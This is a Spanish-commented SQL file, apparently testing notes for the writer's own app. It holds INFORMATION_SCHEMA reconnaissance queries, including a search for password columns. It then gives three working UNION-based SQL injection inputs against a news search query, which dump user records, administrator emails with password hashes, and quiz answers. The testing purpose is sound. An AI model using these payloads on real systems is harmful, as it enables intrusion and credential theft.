-- *********** PRUEBAS con INFORMATION_SCHEMA ***********

-- Consulta en la tabla SCHEMATA para ver los nombres de las bases de datos del servidor

	SELECT SCHEMA_NAME 
	FROM SCHEMATA;

-- Ver todas las tablas de una base de datos como leafconnect

	SELECT TABLE_NAME
	FROM TABLES
	WHERE TABLE_SCHEMA = 'leafconnect';

-- También podemos comprobar de que base de datos pertenece una tabla

	SELECT * 
	FROM TABLES 
	WHERE TABLE_NAME = 'usuario';

-- Buscar a qué base de datos corresponden las columnas de contenido sensible

	SELECT 
		TABLE_SCHEMA, 	-- Nombre de BD
		TABLE_NAME, 	-- Nombre de tabla
		COLUMN_NAME, 	-- Nombre de columna
		DATA_TYPE 		-- Tipo de dato
	FROM COLUMNS

	WHERE COLUMN_NAME LIKE '%pw%' 
	   OR COLUMN_NAME LIKE '%password%'
	   OR COLUMN_NAME LIKE '%contrasenia%';
   
-- Con esta consulta podemos ver los permisos que tiene cada usuario y si tiene
-- la capacidad de otorgarlo a otros usuarios
   
	SELECT GRANTEE, PRIVILEGE_TYPE, IS_GRANTABLE
	FROM USER_PRIVILEGES;
	
	
	
-- *********** PRUEBAS DE INYECCIÓN SQL ***********

-- Consulta base para buscar por palabra incluida en el título de la noticia:
	SELECT idNoticia, titulo, fechaProgramada 
	FROM Noticias 
	WHERE titulo LIKE '%$buscar%'

-- Consulta para obtener todos los usuarios: 

	-- Input:
	%' UNION SELECT idUsuario, nombre, estado FROM Usuario #'
	
	-- La consulta que se genera es: 
	SELECT idNoticia, titulo, fechaProgramada 
	FROM Noticias 
	WHERE titulo LIKE '%%' 
	UNION 
	SELECT idUsuario, nombre, estado 
	FROM Usuario #%' '
	
-- Consulta para obtener los correos y contraseñas hasheadas de los administradores

	-- Input: 
	%' UNION SELECT correo, password, null FROM Administrador #'

	-- La consulta que se genera es: 
	
	SELECT idNoticia, titulo, fechaProgramada 
	FROM Noticias 
	WHERE titulo LIKE '%%'
	UNION 
	SELECT correo, password, null 
	FROM Administrador #%''

-- Consulta para obtener las respuestas de cada pregunta

	-- Input:
	%' UNION SELECT p.pregunta, o.opcion AS respuesta_correcta, null FROM Preguntas p 
		INNER JOIN RespuestaCorrecta rc ON p.idNoticia = rc.idNoticia AND p.nPregunta = rc.nPregunta 
		INNER JOIN Opciones o ON o.idNoticia = rc.idNoticia AND o.nPregunta = rc.nPregunta AND o.nOpcion = rc.nOpcion #'

	-- La consulta que se genera es: 
	
	SELECT idNoticia, titulo, fechaProgramada 
	FROM Noticias 
	WHERE titulo LIKE '%%'

	UNION 

	SELECT p.pregunta, o.opcion AS respuesta_correcta, null 
	FROM Preguntas p 
	INNER JOIN RespuestaCorrecta rc ON p.idNoticia = rc.idNoticia AND p.nPregunta = rc.nPregunta 
	INNER JOIN Opciones o ON o.idNoticia = rc.idNoticia AND o.nPregunta = rc.nPregunta AND o.nOpcion = rc.nOpcion #%''